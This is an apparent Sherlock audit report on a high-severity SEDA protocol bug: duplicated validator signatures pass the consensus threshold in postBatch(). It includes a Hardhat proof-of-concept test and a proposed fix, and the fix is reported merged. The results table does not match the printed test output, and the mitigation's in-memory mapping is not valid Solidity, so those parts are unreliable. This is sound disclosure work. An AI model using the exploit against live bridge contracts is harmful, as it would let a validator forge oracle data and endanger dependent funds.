---
tags:
  - lang/rust
  - lang/solidity
  - sector/bridge
  - sector/governance
  - sector/oracle
  - sector/staking
  - sector/zk
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - novelty/variant
protocol: "[[SEDA]]"
auditors:
  - "[[0x0x0xw3]]"
  - "[[0xlookman]]"
  - "[[4n0nx]]"
  - "[[Boy2000]]"
  - "[[ChaosSR]]"
  - "[[Kodyvim]]"
  - "[[PASCAL]]"
  - "[[Schnilch]]"
  - "[[Stiglitz]]"
  - "[[abdulsamijay]]"
  - "[[destiny_rs]]"
  - "[[dod4ufn]]"
  - "[[g]]"
  - "[[newspacexyz]]"
  - "[[oxelmiguel]]"
  - "[[rsam_eth]]"
  - "[[tallo]]"
  - "[[verbotenviking]]"
  - "[[zxriptor]]"
report: "https://github.com/sherlock-audit/2024-12-seda-protocol-judging"
genome:
  - "[[wrong-condition]]"
  - "[[variant]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[bridge-validator-threshold]]"
---
# H-2: Malicious validators will bypass consensus threshold requirements affecting the integrity of the [[SEDA]] protocol's cross-chain data verification system

- id: 55229
- impact: HIGH
- protocol: SEDA Protocol
- reporter: newspacexyz (Sherlock)
- source: N/A

## Summary


This bug report discusses a critical security issue with the SEDA protocol's cross-chain data verification system. The issue was discovered by a group of researchers and could potentially allow malicious validators to bypass the consensus mechanism and manipulate data on the network. The root cause of the issue was found in the code that accumulates validator voting power without checking for duplicate entries. This allows malicious validators to artificially inflate their voting power and unilaterally approve batches. The report also outlines the necessary pre-conditions for the attack and provides a proof of concept demonstrating how validators with varying levels of power can exploit the vulnerability. The report concludes with a proposed fix that involves tracking duplicate validators to prevent them from being counted more than once. The protocol team has already implemented this fix in the latest PRs/commits.

## Details

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/62 

## Found by 
0x0x0xw3, 0xlookman, 4n0nx, Boy2000, ChaosSR, Kodyvim, PASCAL, Schnilch, Stiglitz, abdulsamijay, destiny\_rs, dod4ufn, g, newspacexyz, oxelmiguel, rsam\_eth, tallo, verbotenviking, zxriptor

### Summary

A lack of uniqueness validation in validator signature processing will cause a critical security breach for the SEDA protocol as malicious validators will artificially inflate their voting power by submitting duplicate signatures, allowing validators with minimal actual authority to unilaterally approve batches.

### Root Cause

In [seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol:114-119](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L114-L119) the contract accumulates validator voting power without checking if a validator's signature has already been counted:
```solidity
for (uint256 i = 0; i < validatorProofs.length; i++) {
    if (!_verifyValidatorProof(validatorProofs[i], s.lastValidatorsRoot)) {
        revert InvalidValidatorProof();
    }
    if (!_verifySignature(batchId, signatures[i], validatorProofs[i].signer)) {
        revert InvalidSignature();
    }
    votingPower += validatorProofs[i].votingPower;
}
```
The code fails to track which validators have already contributed to the voting power total, allowing duplicate entries.

### Internal Pre-conditions

1. A malicious validator needs to control at least one validator with any amount of voting power
2. The validator must have the ability to submit transactions to the `Secp256k1ProverV1` contract with multiple copies of their own signature and proof

### External Pre-conditions

None required - the attack can be executed independently of external systems

### Attack Path

1. Attacker identifies their validator's voting power (e.g., 0.25% of total power)
2. Attacker calculates how many duplicates are needed to reach the 66.67% consensus threshold
3. Attacker generates a valid signature for their validator for a malicious batch
4. Attacker creates arrays containing their signature and validator proof repeated the required number of times
5. Attacker calls `postBatch()` with these arrays, passing the verification checks
6. The contract approves the batch despite only having one actual validator's approval

### Impact

The SEDA protocol suffers a complete security breakdown. Validators with minimal voting power can unilaterally approve batches, completely bypassing the consensus mechanism. This allows malicious validators to:

- Post fraudulent data results
- Update the validator set with malicious entries
- Potentially steal funds from dependent contracts that trust SEDA's data
- Undermine the foundational security assumptions of the cross-chain oracle system

### PoC

```solidity
// Add test case at: `seda-evm-contracts/test/prover/Secp256k1ProverV1.test.ts`
it('proves vulnerability scales with validator power percentage', async () => {
  // Create test fixtures with different validator power distributions
  const distributions = [
    { description: "Tiny validator (0.25%)", validatorCount: 100, validatorIndex: 1 },
    { description: "Small validator (1%)", validatorCount: 25, validatorIndex: 1 },
    { description: "Medium validator (5%)", validatorCount: 10, validatorIndex: 2 },
    { description: "Larger validator (10%)", validatorCount: 9, validatorIndex: 1 }
  ];
  
  for (const dist of distributions) {
    console.log(`\nTesting: ${dist.description}`);
    
    // Deploy with specific validator count
    const { prover: customProver, data: customData } = await deployWithSize({ validators: dist.validatorCount });
    const customWallets = customData.wallets;
    
    // Get validator power and calculate percentage
    const validatorPower = customData.validatorProofs[dist.validatorIndex].votingPower;
    const totalPower = 100000000; // Default total
    const powerPercentage = (validatorPower / totalPower) * 100;
    console.log(`Validator has ${validatorPower} voting power (${powerPercentage.toFixed(2)}% of total)`);
    
    // Create batch and sign with this validator
    const { newBatchId, newBatch } = generateNewBatchWithId(customData.initialBatch);
    const signature = await customWallets[dist.validatorIndex].signingKey.sign(newBatchId).serialized;
    
    // Verify single signature doesn't reach consensus
    try {
      await customProver.postBatch(newBatch, [signature], [customData.validatorProofs[dist.validatorIndex]]);
      console.log("ERROR: Single signature was enough - test invalid");
    } catch (e) {
      // Calculate required duplicates
      const consensusThreshold = 66_670_000; // 66.67%
      const duplicatesNeeded = Math.ceil(consensusThreshold / validatorPower);
      console.log(`Need ${duplicatesNeeded} duplicates to reach consensus threshold`);
      
      // Prepare duplicated arrays
      const signatures = Array(duplicatesNeeded).fill(signature);
      const duplicatedProofs = Array(duplicatesNeeded).fill(customData.validatorProofs[dist.validatorIndex]);
      
      const [batchSender] = await ethers.getSigners();
      
      // Demonstrate exploit
      await expect(customProver.postBatch(newBatch, signatures, duplicatedProofs))
        .to.emit(customProver, 'BatchPosted')
        .withArgs(newBatch.batchHeight, newBatchId, batchSender.address);
      
      // Verify success
      const lastBatchHeight = await customProver.getLastBatchHeight();
      expect(lastBatchHeight).to.equal(newBatch.batchHeight);
      
      console.log(`EXPLOIT SUCCESSFUL: ${powerPercentage.toFixed(2)}% validator can update batches with ${duplicatesNeeded} duplicates`);
    }
  }
});
```

The results demonstrate how validators with any amount of power can exploit the vulnerability:

Validator Power | Duplicates Required | Notes
-- | -- | --
0.25% | 267 | Even tiny validators can exploit the vulnerability
1% | 67 | Small validators need moderate duplication
5% | 14 | Medium validators need minimal duplication
10% | 7 | Larger validators need very few duplicates

The lower the validator's power, the more duplicates are needed, but all validators can eventually reach the threshold.

Command to run test:
```bash
npx hardhat test test/prover/Secp256k1ProverV1.test.ts --grep "proves vulnerability scales with validator power percentage"
```

Result example:
```bash

  Secp256k1ProverV1

Testing: Tiny validator (0.25%)
Validator has 252525 voting power (0.25% of total)
Need 265 duplicates to reach consensus threshold
EXPLOIT SUCCESSFUL: 0.25% validator can update batches with 265 duplicates

Testing: Small validator (1%)
Validator has 1041666 voting power (1.04% of total)
Need 65 duplicates to reach consensus threshold
EXPLOIT SUCCESSFUL: 1.04% validator can update batches with 65 duplicates

Testing: Medium validator (5%)
Validator has 2777777 voting power (2.78% of total)
Need 25 duplicates to reach consensus threshold
EXPLOIT SUCCESSFUL: 2.78% validator can update batches with 25 duplicates

Testing: Larger validator (10%)
Validator has 3125000 voting power (3.13% of total)
Need 22 duplicates to reach consensus threshold
EXPLOIT SUCCESSFUL: 3.13% validator can update batches with 22 duplicates
    ✔ proves vulnerability scales with validator power percentage (1559ms)


  1 passing (2s)
```

### Mitigation

Add uniqueness tracking to prevent counting the same validator more than once:

```solidity
function postBatch(
    SedaDataTypes.Batch calldata newBatch,
    bytes[] calldata signatures,
    SedaDataTypes.ValidatorProof[] calldata validatorProofs
) external override(ProverBase) whenNotPaused {
    // ... existing code ...
    
    uint64 votingPower = 0;
    mapping(address => bool) memory seenValidators;
    
    for (uint256 i = 0; i < validatorProofs.length; i++) {
        address signer = validatorProofs[i].signer;
        
        // Prevent duplicate validators
        if (seenValidators[signer]) {
            revert DuplicateValidator(signer);
        }
        seenValidators[signer] = true;
        
        // ... existing verification code ...
        
        votingPower += validatorProofs[i].votingPower;
    }
    
    // ... rest of function ...
}
```

This fix ensures each validator is only counted once when calculating the total voting power, preserving the integrity of the consensus mechanism.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/sedaprotocol/seda-evm-contracts/pull/95
